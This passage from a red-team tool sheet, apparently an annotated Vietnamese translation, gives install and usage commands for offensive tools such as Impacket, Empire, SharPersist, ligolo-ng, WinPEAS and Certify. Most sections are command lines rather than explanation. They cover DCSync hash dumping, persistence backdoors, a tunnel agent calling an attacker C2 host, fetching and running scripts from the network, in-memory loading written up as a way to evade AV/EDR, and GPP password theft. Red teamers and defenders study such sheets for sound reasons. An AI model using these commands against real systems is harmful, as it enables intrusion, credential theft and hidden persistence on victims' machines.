#-> Chỉ kiểm tra các đường dẫn có thể sửa đổi trong %PATH% của người dùng bất kể cấp độ toàn vẹn hay tư cách nhóm.
```
**Lưu ý:** Các ví dụ về cách sử dụng **SharpUp.exe** với các đối số khác nhau để thực hiện các kiểm tra nâng quyền cục bộ trên máy **Windows** mà nó đang chạy. Nó giúp xác định các cơ hội nâng quyền.

Toàn bộ nhóm lệnh và tham số có thể được tìm thấy [tại đây](https://github.com/GhostPack/SharpUp#command-groups).

![image](https://user-images.githubusercontent.com/100603074/210079939-e709cced-04a2-44a5-9da0-f387bc6599b1.png)

### [🔙](#tool-list)[**SQLRecon**](https://github.com/skahwah/SQLRecon)

**MS-SQL** (Microsoft SQL Server) là một hệ quản trị cơ sở dữ liệu quan hệ được phát triển và tiếp thị bởi Microsoft.

This C# **MS-SQL toolkit** is designed for offensive reconnaissance and **post-exploitation**. For detailed usage information on each technique, refer to the [wiki](https://github.com/skahwah/SQLRecon/wiki).

**Install (Binary):**

You can download the latest binary release from [tại đây](https://github.com/skahwah/SQLRecon/releases).
**Lưu ý:** Tải xuống file `.exe` đã được biên dịch sẵn.

**Cách sử dụng:**

```bash
# Authenticating using Windows credentials
SQLRecon.exe -a Windows -s SQL01 -d master -m whoami

# Authenticating using Local credentials
SQLRecon.exe -a Local -s SQL02 -d master -u sa -p Password123 -m whoami

# Authenticating using Azure AD credentials
SQLRecon.exe -a azure -s azure.domain.com -d master -r domain.com -u skawa -p Password123 -m whoami

# Run whoami
SQLRecon.exe -a Windows -s SQL01 -d master -m whoami

# View databases
SQLRecon.exe -a Windows -s SQL01 -d master -m databases

# View tables
SQLRecon.exe -a Windows -s SQL01 -d master -m tables -o AdventureWorksLT2019
```
**Lưu ý:** Các ví dụ sử dụng **công cụ SQLRecon.exe** với các tham số dòng lệnh. `-a` chỉ định phương thức xác thực, `-s` tên server SQL, `-d` database, `-u` người dùng, `-p` mật khẩu, `-r` realm, `-m` module (hành động muốn thực hiện như `whoami`, `databases`, `tables`, ...), `-o` đối tượng cụ thể cho module. Công cụ này chạy trên **Windows** và tương tác với **server MS-SQL**.

Full usage information can be found on the [wiki](https://github.com/skahwah/SQLRecon/wiki).

Tool module usage information can be found [tại đây](https://github.com/skahwah/SQLRecon#usage).

![image](https://user-images.githubusercontent.com/100603074/211530318-6e115272-a00c-4e9e-af9a-852d476ff3fb.png)

*Hình ảnh được sử dụng từ trang trợ giúp SQLRecon*

### [🔙](#tool-list)[**UltimateAppLockerByPassList**](https://github.com/api0cradle/UltimateAppLockerByPassList)

This resrouce is a collection of the most common and known techniques to bypass **AppLocker**.

Since **AppLocker** can be configured in different ways [@api0cradle](https://github.com/api0cradle) maintains a verified list of bypasses (that works against the default **AppLocker** rules) and a list with possible bypass technique (depending on configuration) or claimed to be a bypass by someone.

They also have a list of generic bypass techniques as well as a legacy list of methods to execute through DLLs.

Indexed Lists

- [Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
- [VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
- [UnverifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/UnverifiedAppLockerBypasses.md)
- [DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
**Lưu ý:** Các liên kết này trỏ đến các tệp **Markdown** trong kho lưu trữ, liệt kê các kỹ thuật bypass **AppLocker** khác nhau. Tài nguyên này chủ yếu là tài liệu.

![image](https://user-images.githubusercontent.com/100603074/217654010-5fa1102b-7463-4389-bd73-48a6b8a752bc.png)

*Hình ảnh được sử dụng từ https://github.com/api0cradle/UltimateAppLockerByPassList*

### [🔙](#tool-list)[**StarFighters**](https://github.com/Cn33liz/StarFighters)

A **JavaScript** and **VBScript Based Empire Launcher**, which runs within their own embedded **PowerShell Host**.

Both Launchers run within their own embedded **PowerShell Host**, so we don't need **PowerShell.exe**.

This might be usefull when a company is blocking **PowerShell.exe** and/or is using a **Application Whitelisting** solution, but does not block running JS/VBS files.

**Cách sử dụng:**

- Setup a new Listener within **PowerShell Empire**
- Use the `Launcher` command to Generate a **PowerShell launcher** for this listener
- Copy and Replace the Base64 encoded Launcher Payload within the **StarFighter JavaScript** or **VBScript file**

For the **JavaScript** version use the following Variable:

```javascript
  var EncodedPayload = "<Paste Encoded Launcher Payload Here>"
```

For the **VBScript** version use the following Variable:

```vbscript
  Dim EncodedPayload: EncodedPayload = "<Paste Encoded Launcher Payload Here>"
```

- Then run: `wscript.exe StarFighter.js` or `StarFighter.vbs` on Target, or DoubleClick the launchers within Explorer.
**Lưu ý:** Đây là hướng dẫn sử dụng các tệp **script StarFighters** sau khi đã có **payload** từ **Empire C2 framework**. Bạn copy **payload** **Base64** đã tạo và dán vào biến `EncodedPayload` trong tệp `.js` hoặc `.vbs` của **StarFighters**. Sau đó thực thi tệp `.js` hoặc `.vbs` trên máy mục tiêu bằng `wscript.exe` hoặc nhấp đúp. Do **WSH** có thể thực thi **JavaScript** và **VBScript** mà không cần gọi trực tiếp **PowerShell.exe**, kỹ thuật này giúp né tránh các giải pháp chặn **PowerShell.exe**.

![image](https://user-images.githubusercontent.com/100603074/217654090-d8f57773-4fa0-44dd-b5b1-ad4b66f7c98e.png)

*Hình ảnh được sử dụng từ https://www.hackplayers.com/2017/06/startfighters-un-launcher-de-empire-en-js-vbs.html*

### [🔙](#tool-list)[**demiguise**](https://github.com/nccgroup/demiguise)

The aim of this project is to generate **.html** files that contain an encrypted **HTA** file.

The idea is that when your target visits the page, the key is fetched and the **HTA** is decrypted dynamically within the browser and pushed directly to the user.

This is an evasion technique to get round content / file-type inspection implemented by some security-appliances.

Further technical information [tại đây](https://github.com/nccgroup/demiguise#how-does-it-do-it).

**Install:**

```
git clone https://github.com/nccgroup/demiguise
cd demiguise
```
**Lưu ý:** Cài đặt từ mã nguồn bằng **Git**.

**Cách sử dụng:**

```bash
# Generate an encrypted .hta file that executes notepad.exe
python demiguise.py -k hello -c "notepad.exe" -p Outlook.Application -o test.hta
```
**Lưu ý:** Chạy **script Python demiguise.py** để tạo một tệp `.hta` được mã hóa. `-k` là khóa mã hóa, `-c` là lệnh sẽ được thực thi bởi HTA đã giải mã, `-p` là quy trình mục tiêu có khả năng thực thi đối tượng COM (ví dụ: **Outlook.Application**), `-o` là tên file output. Công cụ này tạo ra file **HTML** chứa HTA đã mã hóa và logic giải mã. Khi nạn nhân mở file HTML này (thường gửi qua email), mã JavaScript sẽ chạy, giải mã HTA và thực thi nó bằng `mshta.exe`.

![image](https://user-images.githubusercontent.com/100603074/217654229-fb3a4875-2de2-4bc3-9583-8300e014fda4.png)

*Hình ảnh được sử dụng từ https://github.com/nccgroup/demiguise*

## [🔙](#tool-list)[**PowerZure**](https://github.com/hausec/PowerZure)

**PowerZure** is a **PowerShell** project created to assess and exploit resources within **Microsoft’s cloud platform, Azure**. **PowerZure** was created out of the need for a framework that can both perform reconnaissance and exploitation of **Azure, AzureAD**, and the associated resources.

There is zero reason to ever run **PowerZure** on a victim’s machine. Authentication is done by using an existing accesstoken.json file or by logging in via prompt when logging into Azure, meaning you can safely use **PowerZure** to interact with a victim’s cloud instance from your operating machine.

**Install:**

```bash
Install-Module -Name Az
git clone https://github.com/hausec/PowerZure
cd PowerZure
ipmo C:\path\to\PowerZure.psd1
```
**Lưu ý:**
`Install-Module -Name Az`: Cài đặt module Azure chính thức của Microsoft cho **PowerShell**. Cần có để **PowerZure** hoạt động. Yêu cầu kết nối internet.
`git clone ...`: Tải mã nguồn **PowerZure** từ GitHub.
`ipmo ...`: (hoặc `Import-Module`) Import module **PowerZure** từ đường dẫn cục bộ. `ipmo` là bí danh cho `Import-Module`.

**Cách sử dụng:**

```bash
# Get a list of AzureAD and Azure objects you have access to
Get-AzureTarget
```
**Lưu ý:** Lệnh này là một trong các cmdlet (**command-let**) của **PowerZure**. Nó sẽ liệt kê các đối tượng và tài nguyên trong **Azure** và **Azure AD** mà người dùng hiện tại có quyền truy cập, dựa trên ngữ cảnh xác thực đã được thiết lập. Hữu ích cho giai đoạn **discovery** và **reconnaissance** trong môi trường **cloud Azure**.

[Blog - Attacking Azure, Azure AD, and Introducing PowerZure](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)

![image](https://user-images.githubusercontent.com/100603074/229649681-a1d83b3c-b595-417b-8d77-c3ba90da203f.png)

*Hình ảnh được sử dụng từ https://hakin9.org*

**Persistence**
====================

### [🔙](#tool-list)[**Impacket**](https://github.com/fortra/impacket)

**Impacket** provides a set of low-level **Python binding**s for various network protocols, including **SMB, Kerberos**, and **LDAP**, as well as higher-level libraries for interacting with network services and performing specific tasks such as dumping password hashes and creating network shares.

It also includes a number of command-line tools that can be used to perform various tasks such as dumping **SAM databases**, enumerating **domain trust**s, and cracking Windows passwords.

**Install:**

```bash
python3 -m pip install impacket
```
**Lưu ý:** Cài đặt thư viện **Python Impacket** cùng với các tiện ích command-line liên quan.

**Install (With Example Scripts):**

Download and extract [the package](https://github.com/fortra/impacket), then navigate to the install folder and run...

```bash
python3 -m pip install .
```
**Lưu ý:** Cài đặt **Impacket** trực tiếp từ mã nguồn để đảm bảo có cả thư mục `examples` chứa các **script** hữu ích khác như **secretsdump.py**, **smbclient.py**, **psexec.py**, ...

**Cách sử dụng:**

```bash
# Trích xuất hash NTLM với các file cục bộ
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# DCSync attack và dump các hash NTLM của tất cả người dùng domain.
secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
```
**Lưu ý:** (Đã giải thích trong phần Execution). **Impacket** là một thư viện rất mạnh cho các tác vụ tấn công **Active Directory** và **Windows** dựa trên protocol.

```bash
# Gets a list of the sessions opened at the remote hosts
netview.py domain/user:password -target 192.168.10.2

# Retrieves the MSSQL instances names from the target host.
mssqlinstance.py 192.168.1.2

# This script will gather data about the domain's users and their corresponding email addresses.
GetADUsers.py domain/user:password@IP
```
**Lưu ý:** Các ví dụ khác về các script tiện ích của **Impacket**:
`netview.py`: Liệt kê các phiên **SMB** mở trên máy tính từ xa.
`mssqlinstance.py`: Phát hiện các instance **MS-SQL** trên mạng.
`GetADUsers.py`: Thu thập thông tin người dùng AD bao gồm địa chỉ email.
Những script này cần thông tin xác thực hợp lệ trên **domain** mục tiêu để hoạt động.

Great [cheat sheet](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/) for **Impacket** usage.

![image](https://user-images.githubusercontent.com/100603074/210079475-a13f7fe2-7801-40dd-977b-e179d0658b47.png)

### [🔙](#tool-list)[**Empire**](https://github.com/EmpireProject/Empire)

**Empire** is a **post-exploitation framework** that allows you to generate **payloads** for establishing remote connections with victim systems.

Once a **payload** has been executed on a victim system, it establishes a connection back to the **Empire server**, which can then be used to issue commands and control the target system.

**Empire** also includes a number of built-in modules and scripts that can be used to perform specific tasks, such as dumping password hashes, accessing the **Windows registry**, and exfiltrating data.

**Install:**

```bash
git clone https://github.com/EmpireProject/Empire
cd Empire
sudo ./setup/install.sh
```
**Lưu ý:** Clone mã nguồn và chạy **script cài đặt** của **Empire**. Yêu cầu quyền **super user** (`sudo`). Script này sẽ cài đặt các dependency cần thiết (PowerShell Empire, Python, Ruby,...) để chạy server **Empire**. Chạy trên **Linux**.

**Cách sử dụng:**

```bash
# Bắt đầu Empire
./empire

# Liệt kê các agent đang hoạt động
list agents

# Liệt kê các listeners đang hoạt động
list listeners
```
**Lưu ý:** Các lệnh được sử dụng bên trong **console Empire** sau khi framework đã khởi động.

Nice usage [cheat sheet](https://github.com/HarmJ0y/CheatSheets/blob/master/Empire.pdf) by [HarmJoy](https://github.com/HarmJ0y).

![image](https://user-images.githubusercontent.com/100603074/210080911-b3c7572a-a0dd-4664-a3e1-46b343db8a79.png)

### [🔙](#tool-list)[**SharPersist**](https://github.com/mandiant/SharPersist)

A **Windows persistence toolkit** written in **C#**.

The project has a [wiki](https://github.com/mandiant/SharPersist/wiki).

**Install (Binary):**

You can find the most recent release [tại đây](https://github.com/mandiant/SharPersist/releases).
**Lưu ý:** Tải xuống file `.exe` đã được biên dịch sẵn.

**Install (Biên dịch):**

- Download the project files from the [GitHub Repo](https://github.com/mandiant/SharPersist).
- Load the Visual Studio project up and go to "**Tools**" --> "**NuGet Package Manager**" --> "**Package Manager Settings**"
- Go to "**NuGet Package Manager**" --> "**Package Sources**"
- Add a package source with the URL "https://api.nuget.org/v3/index.json"
- Install the **Costura.Fody NuGet package**. The older version of **Costura.Fody** (3.3.3) is needed, so that you do not need Visual Studio 2019.
	- `Install-Package Costura.Fody -Version 3.3.3`
- Install the **TaskScheduler package**
	- `Install-Package TaskScheduler -Version 2.8.11`
- You can now build the project yourself!
**Lưu ý:** Hướng dẫn chi tiết để biên dịch **SharPersist** từ mã nguồn **C#** bằng **Visual Studio**, bao gồm cài đặt các gói **NuGet** phụ thuộc để nhúng các DLL phụ trợ vào tệp thực thi chính.

**Cách sử dụng:**

A full list of usage examples can be found [tại đây](https://github.com/mandiant/SharPersist#adding-persistence-triggers-add).

```
#KeePass
SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add

#Registry
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add

#Scheduled Task Backdoor
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

#Startup Folder
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
```
**Lưu ý:** Các ví dụ sử dụng **công cụ SharPersist.exe** với các tùy chọn. `-t` chỉ định kỹ thuật duy trì truy cập (registry, task theo lịch, startup folder, ...). `-c` là lệnh cần thực thi để duy trì truy cập. `-m add` thêm mục duy trì truy cập. Mỗi kỹ thuật có thêm các tham số cụ thể (`-k`, `-v` cho registry; `-n` cho task theo lịch; `-f` cho startup folder hoặc config file **KeePass**). Công cụ chạy trên **Windows**.

![image](https://user-images.githubusercontent.com/100603074/208880117-3ce7eefc-9e0b-477d-ada4-b3867909ff38.png)

### [🔙](#tool-list)[**ligolo-ng**](https://github.com/nicocha30/ligolo-ng)

**Ligolo-ng** is a simple, lightweight and fast tool that allows pentesters to establish **tunnel**s from a **reverse TCP/TLS connection** using a **tun interface** (without the need of **SOCKS**).

Instead of using a **SOCKS proxy** or **TCP/UDP forwarder**s, **Ligolo-ng** creates a userland network stack using [**Gvisor**](https://gvisor.dev/).

When running the **relay/proxy server**, a **tun interface** is used, packets sent to this interface are translated, and then transmitted to the agent remote network.

**Cài đặt (Tải xuống):**

Precompiled binaries (**Windows/Linux/macOS**) are available on the [Release page](https://github.com/nicocha30/ligolo-ng/releases).
**Lưu ý:** Phương pháp đơn giản nhất là tải xuống file binary đã biên dịch sẵn.

**Cài đặt (Build):**

*Building **ligolo-ng** (**Go >= 1.17** is required):*

```bash
go build -o agent cmd/agent/main.go
go build -o proxy cmd/proxy/main.go

# Build cho Windows
GOOS=windows go build -o agent.exe cmd/agent/main.go
GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```
**Lưu ý:** Các lệnh này biên dịch mã nguồn **Golang** để tạo ra file binary cho `agent` (chạy trên máy nạn nhân) và `proxy` (chạy trên máy attacker). Bạn có thể chỉ định hệ điều hành mục tiêu (`GOOS=windows`). Yêu cầu môi trường phát triển **Go**.

**Thiết lập (Linux):**

```bash
sudo ip tuntap add user [tên_người_dùng_của_bạn] mode tun ligolo
sudo ip link set ligolo up
```
**Lưu ý:** Các lệnh này thiết lập giao diện TUN trên hệ thống **Linux** bằng tiện ích `ip`. Yêu cầu quyền **super user** (`sudo`). Giao diện TUN này sẽ được sử dụng bởi `proxy` server để chuyển tiếp lưu lượng mạng vào **tunnel**.

**Thiết lập (**Windows**):**

You need to download the [Wintun](https://www.wintun.net/) driver (used by [WireGuard](https://www.wireguard.com/)) and place the `wintun.dll` in the same folder as **Ligolo** (make sure you use the right architecture).
**Lưu ý:** Để **ligolo-ng** hoạt động trên **Windows**, cần có thư viện **Wintun** để tạo giao diện mạng userland.

**Thiết lập (Proxy server):**

```bash
./proxy -h # Các tùy chọn trợ giúp
./proxy -autocert # Tự động yêu cầu chứng chỉ LetsEncrypt
```
**Lưu ý:** Chạy tệp nhị phân `proxy` server trên máy attacker.

**Cách sử dụng:**

*Start the agent on your target (victim) computer (no privileges are required!):*

```bash
./agent -connect attacker_c2_server.com:11601
```
**Lưu ý:** Chạy tệp nhị phân `agent` trên máy nạn nhân, kết nối về địa chỉ/cổng của `proxy` server của attacker. Cổng 11601 là cổng mặc định cho kết nối reverse TLS. Agent tạo **tunnel** reverse shell về attacker.

A session should appear on the proxy server.

```
INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
```

Use the session command to select the agent.

```
ligolo-ng » session
? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
```

Full usage information can be found [tại đây](https://github.com/nicocha30/ligolo-ng#using-ligolo-ng).

![image](https://user-images.githubusercontent.com/100603074/216729440-80871cad-4c06-4eb5-8e91-d083ea3f1d2b.png)

*Hình ảnh được sử dụng từ https://github.com/nicocha30/ligolo-ng#demo*

**Privilege Escalation**
====================

### [🔙](#tool-list)[**Crassus**](https://github.com/vu-ls/Crassus)

"Accenture made a tool called Spartacus, which finds **DLL hijacking opportunities** on **Windows**. Using Spartacus as a starting point, we created **Crassus** to extend **Windows privilege escalation** finding capabilities beyond simply looking for missing files. The **ACLs** used by files and directories of privileged processes can find more than just looking for missing files to achieve the goal." - [Liên kết](https://github.com/vu-ls/Crassus?tab=readme-ov-file#why-crassus)

**Install (Build):**

**Crassus** was developed as a **Visual Studio 2019** project. To build **Crassus.exe**:

1. Open **Crassus.sln**
2. Press **Ctrl+Shift+B** on your keyboard
**Lưu ý:** Hướng dẫn biên dịch mã nguồn **C#** bằng **Visual Studio**.

**Install (Precompiled):**

If you trust running other people's code without knowing what it does, **Crassus.exe** is [provided in this repository](https://github.com/vu-ls/Crassus/blob/main/binaries/Crassus.exe).
**Lưu ý:** Tải file `.exe` đã biên dịch sẵn.

**Cách sử dụng:**

1. In [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), select the `Enable Boot Logging` option.
2. Reboot.
3. Once you have logged in and Windows has settled, optionally also run [scheduled tasks that may be configured to run with privileges](https://gist.github.com/wdormann/8afe4edf605627ee4f203861b6cc3a1c).
4. Run **Process Monitor** once again.
5. When prompted, save the boot log.
6. Reset the default Process Monitor filter using `Ctrl-R`.
7. Save this log file, e.g., to `boot.PML`. The reason for re-saving the log file is twofold:
    1. Older versions of Process Monitor do not save boot logs as a single file.
    2. Boot logs by default will be unfiltered, which may contain extra noise, such as a local-user **DLL hijacking** in the launching of of Process Monitor itself.
**Lưu ý:** Hướng dẫn chi tiết về quy trình sử dụng **Crassus**. Bạn cần sử dụng **Process Monitor** (một **công cụ Sysinternals**) để ghi lại hoạt động hệ thống trong quá trình khởi động hoặc thực thi các tiến trình khác. File log từ **Procmon** này (`boot.PML` hoặc file bạn tự lưu) sẽ được sử dụng làm đầu vào cho **Crassus.exe** để phân tích và tìm kiếm các cơ hội nâng quyền cục bộ (liên quan đến **DLL hijacking** và quyền truy cập file/thư mục).

![Crassus](https://github.com/user-attachments/assets/0194b7bf-80ee-44cd-a576-22bc6888de8a)

*Hình ảnh được sử dụng từ https://github.com/vu-ls/Crassus?tab=readme-ov-file#screenshots*

### [🔙](#tool-list)[**LinPEAS**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

**LinPEAS** is a nice verbose **privilege escalation tool** for finding local privesc routes on **Linux** endpoints.

**Install + Usage:**

```bash
curl -L "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" | sh
```
**Lưu ý:** Lệnh này tải xuống **script LinPEAS** trực tiếp từ **GitHub** bằng `curl` và sau đó thực thi nó bằng `sh`. Phương pháp rất phổ biến để chạy nhanh một **script privesc** trên hệ thống **Linux** mục tiêu đã bị xâm nhập. Output sẽ liệt kê các cơ hội nâng quyền khác nhau dựa trên cấu hình hệ thống, quyền hạn của người dùng, các file cấu hình nhạy cảm, các dịch vụ dễ bị tấn công, ...

![image](https://user-images.githubusercontent.com/100603074/192070104-8a121544-5c88-4c24-8b2e-590700b345e7.png)

### [🔙](#tool-list)[**WinPEAS**](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

**WinPEAS** is a nice verbose **privilege escalation tool** for finding local privesc routes on **Windows** endpoints.

**Install + Usage:**

```bash
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```
**Lưu ý:** Đoạn mã **PowerShell** này tải xuống tệp nhị phân **WinPEASany_ofs.exe** trực tiếp từ **GitHub** vào bộ nhớ (`[byte[]]`) và sau đó load nó như một assembly .NET (`[System.Reflection.Assembly]::Load(...)`) và thực thi hàm `Main`. Điều này cho phép chạy **WinPEAS** trong bộ nhớ của tiến trình **PowerShell**, tránh ghi file `.exe` xuống đĩa và né tránh các biện pháp phát hiện dựa trên chữ ký tệp hoặc giám sát việc tạo tiến trình mới từ các thư mục lạ. **WinPEAS** sau đó sẽ liệt kê các cơ hội nâng quyền cục bộ trên hệ thống **Windows**.

![image](https://user-images.githubusercontent.com/100603074/192070193-fed8a0e8-b82a-4338-9209-6352f33ab6b8.png)

### [🔙](#tool-list)[**linux-smart-enumeration**](https://github.com/diego-treitos/linux-smart-enumeration)

**Linux smart enumeration** is another good, less verbose, **linux privesc tool** for **Linux**.

**Install + Usage:**

```bash
curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh
```
**Lưu ý:** Tải xuống **script lse.sh** từ **GitHub** bằng `curl`, lưu lại (`-Lo`), và cấp quyền thực thi (`chmod 700`). Sau đó có thể chạy script này (`./lse.sh`) để kiểm tra các cơ hội nâng quyền cục bộ trên **Linux**. Output gọn gàng hơn **LinPEAS**.

![image](https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png)

### [🔙](#tool-list)[**Certify**](https://github.com/GhostPack/Certify)

**Certify** is a **C# tool** to enumerate and abuse misconfigurations in **Active Directory Certificate Services (AD CS)**.

**Certify** is designed to be used in conjunction with other **red team tools** and techniques, such as **Mimikatz** and **PowerShell**, to enable red teamers to perform various types of attacks, including **man-in-the-middle** attacks, impersonation attacks, and **privilege escalation** attacks.

**Key features of Certify:**

- Certificate creation
- Certificate signing
- Certificate import
- Certificate trust modification

**Install (Biên dịch):**

**Certify** is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the **Certify** [project .sln](https://github.com/GhostPack/Certify), choose "**Release**", and **build**.
**Lưu ý:** Biên dịch mã nguồn **C#** bằng **Visual Studio**.

**Install (Running Certify Through PowerShell):**

If you want to run **Certify** in-memory through a **PowerShell** wrapper, first compile the **Certify** and **base64-encode** the resulting assembly:

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt
```
**Lưu ý:** Đoạn mã **PowerShell** này đọc tệp nhị phân **Certify.exe** thành các byte, mã hóa chúng thành chuỗi **Base64** và lưu vào tệp văn bản.

**Certify** can then be loaded in a **PowerShell script** with the following (where "aa..." is replaced with the base64-encoded **Certify assembly string**):

```
$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
```
**Lưu ý:** Đoạn mã **PowerShell** này đọc chuỗi **Base64** đã lưu, giải mã nó thành các byte và load các byte đó như một **assembly .NET** trong bộ nhớ.

The Main() method and any arguments can then be invoked as follows:

```
[Certify.Program]::Main("find /vulnerable".Split())
```
**Lưu ý:** Sau khi assembly được load vào bộ nhớ, bạn có thể gọi hàm chính của nó (`Main`) và truyền các đối số như thể bạn đang chạy tệp thực thi trên dòng lệnh. Kỹ thuật này (load assembly trong bộ nhớ) thường được sử dụng để né tránh AV/EDR dựa trên giám sát file.

Full compile instructions can be found [tại đây](https://github.com/GhostPack/Certify#compile-instructions).

**Cách sử dụng:**

```bash
# See if there are any vulnerable templates
Certify.exe find /vulnerable

# Request a new certificate for a template/CA, specifying a DA localadmin as the alternate principal
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin
```
**Lưu ý:** Các ví dụ sử dụng **công cụ Certify.exe**. Module `find /vulnerable` tìm kiếm các mẫu chứng chỉ trong **AD CS** có cấu hình cho phép kẻ tấn công yêu cầu chứng chỉ giả mạo đặc quyền. Module `request` yêu cầu một chứng chỉ mới với các thuộc tính đặc biệt (`/altname`) từ CA, tận dụng lỗ hổng được tìm thấy. Công cụ này rất hữu ích để khai thác các cấu hình sai trong hạ tầng khóa công khai của **Active Directory**.

Full example walkthrough can be found [tại đây](https://github.com/GhostPack/Certify#example-walkthrough).

![image](https://user-images.githubusercontent.com/100603074/210088651-28899ba5-cbbd-4b03-8000-068fd401476d.png)

### [🔙](#tool-list)[**Get-GPPPassword**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

**Get-GPPPassword** is a **PowerShell script** part of the **PowerSploit toolkit**, it is designed to retrieve passwords for local accounts that are created and managed using **Group Policy Preferences (GPP)**.

**Get-GPPPassword** works by searching the **SYSVOL** folder on the **domain controller** for any **GPP** files that contain password information. Once it finds these files, it decrypts the password information and displays it to the user.

**Install:**

Follow the **PowerSploit** [installation instructions](https://github.com/A-poc/RedTeam-Tools#powersploit) from this tool sheet.

```bash
powershell.exe -ep bypass
Import-Module PowerSploit
```
**Lưu ý:** (Đã giải thích trong phần **Execution**).

**Cách sử dụng:**

```bash
# Get all passwords with additional information
Get-GPPPassword

# Get list of all passwords
Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
```
**Lưu ý:** Sử dụng cmdlet `Get-GPPPassword` sau khi đã import module **PowerSploit** vào phiên **PowerShell** hiện tại. Nó tự động quét và tìm các mật khẩu đã lưu trong **GPP** và hiển thị chúng. Lệnh thứ hai sử dụng pipeline (`|`) và cmdlet `ForEach-Object` và `Sort-Object -Uniq` để chỉ hiển thị các mật khẩu duy nhất từ output.

![image](https://user-images.githubusercontent.com/100603074/210089230-6a61579b-849d-4175-96ec-6ea75e001038.png)

### [🔙](#tool-list)[**Sherlock**](https://github.com/rasta-mouse/Sherlock)

**PowerShell script** to quickly find missing software patches for local **privilege escalation** vulnerabilities.

*Hỗ trợ:*

- **MS10-015** : User Mode to Ring (**KiTrap0D**)
- **MS10-092** : Task Scheduler
- **MS13-053** : **NTUserMessageCall Win32k Kernel Pool Overflow**
- **MS13-081** : **TrackPopupMenuEx Win32k NULL Page**
- **MS14-058** : **TrackPopupMenu Win32k Null Pointer Dereference**
- **MS15-051** : ClientCopyImage **Win32k**
- **MS15-078** : Font Driver Buffer Overflow
- **MS16-016** : '**mrxdav.sys**' WebDAV
- **MS16-032** : Secondary Logon Handle
- **MS16-034** : **Windows Kernel-Mode Drivers EoP**
- **MS16-135** : **Win32k Elevation of Privilege**
- **CVE-2017-7199** : Nessus Agent 6.6.2 - 6.10.3 Priv Esc

**Install (PowerShell):**

```bash
# Cài đặt Git
git clone https://github.com/rasta-mouse/Sherlock

# Load powershell module
Import-Module -Name C:\INSTALL_LOCATION\Sherlock\Sherlock.ps1
```
**Lưu ý:** Tải mã nguồn **script Sherlock** bằng **Git** và sau đó import nó như một module vào **PowerShell**. Bạn cần thay đổi `C:\INSTALL_LOCATION` bằng đường dẫn thực tế nơi bạn lưu script.

**Cách sử dụng (PowerShell):**

```bash
# Run all functions
Find-AllVulns

# Run specific function (MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference)
Find-MS14058
```
**Lưu ý:** `Find-AllVulns` là hàm chính trong **script Sherlock** để kiểm tra hệ thống cho tất cả các lỗ hổng **nâng quyền cục bộ** đã biết được hỗ trợ. Các hàm khác (ví dụ: `Find-MS14058`) cho phép kiểm tra một lỗ hổng cụ thể. Các hàm này sẽ kiểm tra sự hiện diện của các bản vá tương ứng hoặc các dấu hiệu khác của lỗ hổng.

![image](https://user-images.githubusercontent.com/100603074/210182250-b5e9a4c1-4d30-4591-b06b-7d58098c7fef.png)

*Hình ảnh được sử dụng từ https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/*

### [🔙](#tool-list)[**Watson**](https://github.com/rasta-mouse/Watson)

**Watson** is a **.NET tool** designed to enumerate missing KBs and suggest exploits for **Privilege Escalation** vulnerabilities.

Great for identifying missing patches and suggesting exploits that could be used to exploit known vulnerabilities in order to gain higher privileges on the system.

**Install:**

Using [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the [**Watson** project .sln](https://github.com/rasta-mouse/Watson), choose "**Release**", and **build**.
**Lưu ý:** Biên dịch mã nguồn **C#** bằng **Visual Studio**.

**Cách sử dụng:**

```bash
# Run all checks
Watson.exe
```
